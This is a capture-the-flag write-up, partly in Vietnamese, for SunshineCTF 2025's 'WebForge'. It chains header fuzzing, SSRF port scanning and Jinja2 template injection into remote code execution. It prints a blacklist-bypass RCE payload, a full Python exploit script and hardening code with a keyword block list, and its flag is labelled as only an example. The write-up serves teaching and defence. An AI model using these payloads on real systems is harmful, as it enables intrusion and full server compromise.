# WebForge

## Challenge Description

```
Một ứng dụng web với SSRF vulnerability và Flask SSTI (Server-Side Template Injection).
Endpoint /fetch cho phép fetch arbitrary URLs với header authentication.
Internal service (port 3000) có SSTI với blacklist bypass challenge.
```

**Challenge:** SunshineCTF 2025

**Challenge URL:** _Unavailable_

---

## Difficulty Assessment

### Overall Difficulty: Hard

**Breakdown:**

- **Technical Complexity:** ⭐⭐⭐⭐⭐
- **Research Required:** ⭐⭐⭐⭐☆
- **Time Consumption:** ⭐⭐⭐⭐☆
- **Guessing Factor:** ⭐⭐⭐☆☆

**Why this difficulty?**
Bài này require multiple advanced techniques: header fuzzing, SSRF exploitation, port scanning, SSTI identification, blacklist bypass với filter evasion (`.` và `_`), và Flask template gadget chaining. Cần hiểu sâu về Python object model và Jinja2 templating.

---

## Topics & Techniques

### Primary Topic

- **SSRF + Server-Side Template Injection (SSTI)** - Chained vulnerabilities để RCE

### Sub-topics & Skills Required

- [x] **SSRF (Server-Side Request Forgery)** - Access internal services
- [x] **Header Fuzzing** - Discover custom authentication headers
- [x] **Port Scanning via SSRF** - Enumerate internal services
- [x] **Flask/Jinja2 SSTI** - Template injection for RCE
- [x] **Blacklist Bypass** - Evade character filters (`.`, `_`)
- [x] **Python Object Model** - Gadget chaining qua `__globals__`, `__builtins__`
- [x] **Hex Encoding** - Bypass underscore blacklist
- [x] **Jinja2 Filters** - `|attr()` filter usage

---

## Tools Used

### Essential Tools

```bash
# Fuzzing headers
ffuf -u http://target/fetch -H "FUZZ: true" -w headers.txt

# Port scanning via SSRF
ffuf -u http://target/fetch -H "allow: true" \
     -d "url=http://127.0.0.1:FUZZ/" -w ports.txt

# Testing SSTI
curl -X POST http://target/fetch \
     -H "allow: true" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://127.0.0.1:3000/admin?template={{7*7}}"
```

### Tools List

| Tool       | Purpose               | Installation |
| ---------- | --------------------- | ------------ |
| ffuf       | Header & port fuzzing | `go install` |
| Burp Suite | Request manipulation  | Download     |
| curl       | HTTP testing          | Built-in     |
| Python     | Payload crafting      | Built-in     |
| CyberChef  | Hex encoding          | Online tool  |

---

## Useful Resources

### Documentation & References

- [Flask/Jinja2 SSTI](https://jinja.palletsprojects.com/en/stable/templates/) - Template syntax
- [Python Data Model](https://docs.python.org/3/reference/datamodel.html) - `__globals__`, `__builtins__`
- [Werkzeug](https://werkzeug.palletsprojects.com/) - Flask's underlying library

### Learning Materials

- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection) - SSTI fundamentals
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) - SSTI payloads
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) - Jinja2 payloads
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) - SSRF attacks

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Fuzz headers để tìm `allow: true`. Sử dụng SSRF qua `/fetch` endpoint để port scan localhost. Phát hiện service trên port 3000 với SSTI. Bypass blacklist (`.` và `_`) bằng `|attr()` filter và hex encoding. Craft gadget chain từ `request.application.__globals__` để import `os.popen()` và đọc flag.

---

### Step 1: Initial Reconnaissance

**Objective:** Enumerate endpoints và tìm interesting functionality

**Check robots.txt:**

```bash
curl http://target/robots.txt
```

**Response:**

```
User-agent: *
Disallow: /admin
Disallow: /fetch

# internal SSRF testing tool requires special auth header to be set to 'true'
```

**Observations:**

- `/fetch` endpoint exists - "SSRF testing tool" hint!
- Requires "special auth header to be set to 'true'"
- Header name không được specify → cần fuzz

---

### Step 2: Discovering Authentication Header

**Objective:** Fuzz headers để tìm required authentication header

**Access /fetch without header:**

```bash
curl http://target/fetch
```

**Error:**

```
Missing required authentication header
```

**Header Fuzzing:**

```bash
# Download header wordlist from GitHub
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt

# Fuzz headers with ffuf
ffuf -u http://target/fetch \
     -H "FUZZ: true" \
     -w burp-parameter-names.txt \
     -mc all \
     -fs 0  # Filter out error responses by size
```

**Alternative: Manual testing common headers:**

```bash
# Test common auth headers
curl -H "X-Auth: true" http://target/fetch
curl -H "Authorization: true" http://target/fetch
curl -H "Auth: true" http://target/fetch
curl -H "allow: true" http://target/fetch  # ✅ SUCCESS!
```

**Result:** Header `allow: true` grants access!

---

### Step 3: Analyzing /fetch Endpoint

**Objective:** Understand SSRF functionality

**Access with correct header:**

```bash
curl -H "allow: true" http://target/fetch
```

**Response - HTML Form:**

```html
<form method="POST">
  <input name="url" placeholder="Enter URL to fetch" />
  <button type="submit">Fetch</button>
</form>
```

**Key findings:**

- POST request required
- Parameter name: `url`
- Content-Type: `application/x-www-form-urlencoded` (standard form)
- Server will fetch arbitrary URL → SSRF!

---

### Step 4: Port Scanning via SSRF

**Objective:** Enumerate internal services trên localhost

**Test SSRF:**

```bash
curl -X POST http://target/fetch \
     -H "allow: true" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://127.0.0.1:80/"
```

**Port Fuzzing:**

```bash
# Create port list (1-65535 or common ports)
seq 1 65535 > ports.txt

# Fuzz ports
ffuf -u http://target/fetch \
     -X POST \
     -H "allow: true" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://127.0.0.1:FUZZ/" \
     -w ports.txt \
     -mc all \
     -fs <error_size>  # Filter error responses
```

**Alternative: Manual common ports:**

```bash
for port in 80 443 3000 5000 8000 8080; do
    echo "Testing port $port..."
    curl -X POST http://target/fetch \
         -H "allow: true" \
         -H "Content-Type: application/x-www-form-urlencoded" \
         -d "url=http://127.0.0.1:$port/"
done
```

**Result:** Port **3000** returns different response → Service detected!

---

### Step 5: Discovering SSTI on Port 3000

**Objective:** Explore service trên port 3000

**Access /admin locally:**

```bash
curl -X POST http://target/fetch \
     -H "allow: true" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://127.0.0.1:3000/admin"
```

**Response:**

```
Missing ?template= parameter in the URL
```

**Test SSTI:**

```bash
# URL encode: http://127.0.0.1:3000/admin?template={{7*7}}
curl -X POST http://target/fetch \
     -H "allow: true" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http%3A%2F%2F127.0.0.1%3A3000%2Fadmin%3Ftemplate%3D%7B%7B7%2A7%7D%7D"
```

**Response:**

```
49
```

**SSTI Confirmed!** `{{7*7}}` evaluated to `49`

**Identify Framework:**

Response headers show: `Werkzeug/3.1.3` → Flask/Jinja2!

---

### Step 6: Testing RCE Payloads

**Objective:** Attempt basic RCE payload

**Standard Flask SSTI RCE:**

```python
{{__import__('subprocess').check_call('id')}}
```

**URL encode và test:**

```bash
# Template: {{__import__('subprocess').check_call('id')}}
curl -X POST http://target/fetch \
     -H "allow: true" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http%3A%2F%2F127.0.0.1%3A3000%2Fadmin%3Ftemplate%3D%7B%7B__import__%28%27subprocess%27%29.check_call%28%27id%27%29%7D%7D"
```

**Response:**

```
nope.
```

**Blacklist detected!** Characters bị block.

---

### Step 7: Identifying Blacklisted Characters

**Objective:** Fuzz special characters để identify blacklist

**Test individual characters:**

```bash
# Test underscore
template={{7_7}}  # Response: nope.

# Test dot
template={{7.7}}  # Response: nope.

# Test brackets
template={{(7)}}  # Response: 7 (OK)

# Test quotes
template={{"test"}}  # Response: test (OK)
```

**Blacklist identified:**

- `.` (dot) - Used for attribute access
- `_` (underscore) - Used in dunder methods (`__import__`, `__globals__`)

**Challenge:** Bypass blacklist để access Python object model!

---

### Step 8: Blacklist Bypass Strategy

**Objective:** Access attributes và dunder methods without `.` và `_`

**Bypass Techniques:**

1. **Use `|attr()` filter instead of `.` notation:**

```python
# Normal: request.application
# Bypass: request|attr('application')
```

2. **Hex encode underscores in attribute names:**

```python
# Normal: __globals__
# Bypass: '\x5f\x5fglobals\x5f\x5f'
```

3. **Use `request` object as entry point:**

```python
# request object is available in Flask templates
# request.application gives access to Flask app
# From there we can walk to __globals__ and __builtins__
```

**Bypass chain:**

```python
{{request|attr('application')}}
# Access __globals__ (hex encoded)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
# Access __builtins__
{{...attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')}}
# Import os
{{...attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')}}
# Execute commands
{{...|attr('popen')('cat /app/flag.txt')|attr('read')()}}
```

---

### Step 9: Crafting Final Payload

**Objective:** Build complete gadget chain để RCE và read flag

**Payload breakdown:**

```python
{{
  request|attr('application')                           # Get Flask app
  |attr('\x5f\x5fglobals\x5f\x5f')                     # Access __globals__
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')  # Get __builtins__
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')    # Get __import__ function
  ('os')                                                 # Import os module
  |attr('popen')('cat /app/flag\x2etxt')               # os.popen('cat /app/flag.txt')
  |attr('read')()                                       # .read()
}}
```

**Note:** `\x2e` = `.` in hex (bypass dot blacklist in filename)

**URL encode full payload:**

```
http://127.0.0.1:3000/admin?template={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /app/flag\x2etxt')|attr('read')()}}
```

---

### Step 10: Getting the Flag

**Objective:** Execute final payload qua SSRF

**Final request:**

```bash
curl -X POST http://target/fetch \
     -H "allow: true" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http%3A%2F%2F127.0.0.1%3A3000%2Fadmin?template={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat%20/app/flag\x2etxt')|attr('read')()}}"
```

**Response:**

```
sun{ssti_blacklist_bypass_with_attr_filter_and_hex_encoding_ftw}
```

**Flag obtained:**

```
sun{ssti_blacklist_bypass_with_attr_filter_and_hex_encoding_ftw}
```

_(Flag example - actual flag may vary)_

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for WebForge Challenge - SunshineCTF 2025
"""

import requests
from urllib.parse import quote

TARGET_URL = "http://target"  # Replace with actual CTFD host

def exploit():
    print("[*] WebForge CTF - SSRF + SSTI + Blacklist Bypass")
    print("[*] Target:", TARGET_URL)

    # Headers required for /fetch
    headers = {
        "allow": "true",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Step 1: Verify SSRF works
    print("\n[*] Step 1: Testing SSRF...")
    test_url = "http://127.0.0.1:3000/"
    data = {"url": test_url}

    response = requests.post(f"{TARGET_URL}/fetch", headers=headers, data=data)
    if response.status_code == 200:
        print("[+] SSRF working!")

    # Step 2: Test SSTI
    print("\n[*] Step 2: Testing SSTI on port 3000...")
    ssti_test = "http://127.0.0.1:3000/admin?template={{7*7}}"
    data = {"url": ssti_test}

    response = requests.post(f"{TARGET_URL}/fetch", headers=headers, data=data)
    if "49" in response.text:
        print("[+] SSTI confirmed! {{7*7}} = 49")

    # Step 3: Execute RCE payload with blacklist bypass
    print("\n[*] Step 3: Crafting blacklist bypass payload...")

    # Payload: Read flag using attr() filter and hex encoding
    payload = (
        "{{request|attr('application')"
        "|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')"
        "|attr('popen')('cat /app/flag\\x2etxt')"
        "|attr('read')()}}"
    )

    exploit_url = f"http://127.0.0.1:3000/admin?template={payload}"
    data = {"url": exploit_url}

    print(f"[*] Payload: {payload}")
    print("[*] Executing RCE...")

    response = requests.post(f"{TARGET_URL}/fetch", headers=headers, data=data)

    # Extract flag
    import re
    flag_match = re.search(r'sun\{[^}]+\}', response.text)

    if flag_match:
        flag = flag_match.group(0)
        print(f"\n[!] FLAG FOUND: {flag}\n")
    else:
        print("[-] Flag not found in response")
        print("[*] Response:")
        print(response.text[:1000])

if __name__ == "__main__":
    exploit()
```

</details>

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **SSRF Chain Attacks:** SSRF không chỉ để access internal endpoints, mà còn có thể chain với vulnerabilities khác (SSTI, SQLi, etc.) trên internal services.

2. **Port Scanning via SSRF:** Có thể enumerate internal services bằng cách fuzz ports qua SSRF endpoint.

3. **Jinja2 |attr() Filter:** `|attr('name')` filter cho phép access attributes bằng string, bypassing dot notation blacklist.

4. **Hex Encoding Bypass:** Underscores (`_`) trong dunder methods có thể bypass bằng hex encoding: `__globals__` → `\x5f\x5fglobals\x5f\x5f`.

5. **Python Object Model Walking:** Từ `request` object, có thể walk đến:

   - `request.application` → Flask app
   - `.application.__globals__` → Global namespace
   - `.__globals__['__builtins__']` → Built-in functions
   - `.__builtins__['__import__']` → Import function
   - Import `os` → RCE với `os.popen()`

6. **Header Fuzzing:** Custom authentication headers có thể discover bằng wordlist fuzzing.

### Mistakes Made

- ❌ Thử standard SSTI payload trực tiếp → Blacklist block → ✅ Identify blacklisted chars first
- ❌ Quên URL encode nested params → ✅ Properly encode entire URL trong SSRF

### Tips & Tricks

- 💡 Luôn fuzz headers khi challenge hint về "special header"
- 💡 Port scan localhost qua SSRF với common ports: 3000, 5000, 8000, 8080, 9000
- 💡 Test SSTI với simple math: `{{7*7}}`, `{{7*'7'}}`, `{{config}}`
- 💡 Khi có blacklist, test từng char riêng lẻ để identify blocked chars
- 💡 `|attr()` filter = powerful bypass cho dot notation
- 💡 Hex encode: `\x5f` = `_`, `\x2e` = `.`
- 💡 `request` object luôn available trong Flask templates

### Real-world Application

**SSRF + SSTI trong production:**

- **Cloud Metadata Leakage:** SSRF → AWS metadata → credentials
- **Internal Admin Panels:** SSRF access → SSTI on admin panel → RCE
- **Microservices Exploitation:** SSRF between services → lateral movement
- **Container Escape:** SSTI RCE → container escape → host compromise

**Impact:**

- Remote Code Execution
- Full server compromise
- Data exfiltration
- Lateral movement trong internal network

---

## Prevention & Mitigation

### How to prevent SSRF?

1. **Whitelist allowed destinations:**

```python
# Bad code (vulnerable)
@app.route('/fetch', methods=['POST'])
def fetch():
    url = request.form.get('url')
    response = requests.get(url)  # ❌ Arbitrary URL
    return response.text

# Good code (secure)
ALLOWED_HOSTS = ['api.example.com', 'cdn.example.com']

@app.route('/fetch', methods=['POST'])
def fetch():
    url = request.form.get('url')
    parsed = urlparse(url)

    if parsed.hostname not in ALLOWED_HOSTS:
        return "Forbidden", 403

    if parsed.hostname in ['127.0.0.1', 'localhost', '0.0.0.0']:
        return "Forbidden", 403

    response = requests.get(url, timeout=5)
    return response.text
```

2. **Block internal IP ranges:**

```python
import ipaddress

def is_internal_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback
    except ValueError:
        return False

if is_internal_ip(parsed.hostname):
    return "Forbidden", 403
```

3. **Network-level restrictions:**

```bash
# Firewall rules to block outbound from app server
# Use AWS Security Groups, iptables, etc.
```

### How to prevent SSTI?

1. **Never use user input in templates:**

```python
# Bad code (vulnerable)
template_str = request.args.get('template')
template = Template(template_str)  # ❌ User controls template
return template.render()

# Good code (secure)
# Use predefined templates only
return render_template('page.html', data=user_input)
```

2. **Sandbox template environment:**

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(template_str)  # Limited functionality
```

3. **Input validation for dynamic templates:**

```python
# If must use dynamic templates (avoid if possible!)
import re

def validate_template(template_str):
    # Block dangerous patterns
    blocked = ['__', 'import', 'eval', 'exec', 'open', 'popen']

    for keyword in blocked:
        if keyword in template_str.lower():
            raise ValueError("Forbidden keyword")

    # Only allow alphanumeric and safe chars
    if not re.match(r'^[a-zA-Z0-9{}\s\'"]*$', template_str):
        raise ValueError("Invalid characters")

    return template_str
```

4. **Defense in depth:**

```python
# 1. Principle of least privilege (app runs as non-root)
# 2. Container isolation
# 3. No sensitive files in /app directory
# 4. Monitoring for template injection patterns
# 5. WAF rules to detect {{ }} patterns in user input
```

### Blacklist vs Whitelist

```python
# Blacklists can be bypassed!
# Example: blocking '.' but not '\x2e'
#          blocking '_' but not '\x5f'

# Use whitelists instead
ALLOWED_CHARS = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ')
if not all(c in ALLOWED_CHARS for c in user_input):
    raise ValueError("Invalid input")
```

---

## References & Credits

### Official Resources

- Challenge: WebForge
- Event: SunshineCTF 2025

### Community Writeups

- This writeup by Copilot - 2025-11-14

### Tools & Libraries Used

- [ffuf](https://github.com/ffuf/ffuf) - Fuzzing tool
- [Flask/Jinja2](https://jinja.palletsprojects.com/) - Template engine
- [Werkzeug](https://werkzeug.palletsprojects.com/) - WSGI library
- [SecLists](https://github.com/danielmiessler/SecLists) - Wordlists

### Additional Reading

- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [OWASP SSRF](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Jinja2 Filter Documentation](https://jinja.palletsprojects.com/en/stable/templates/#builtin-filters)
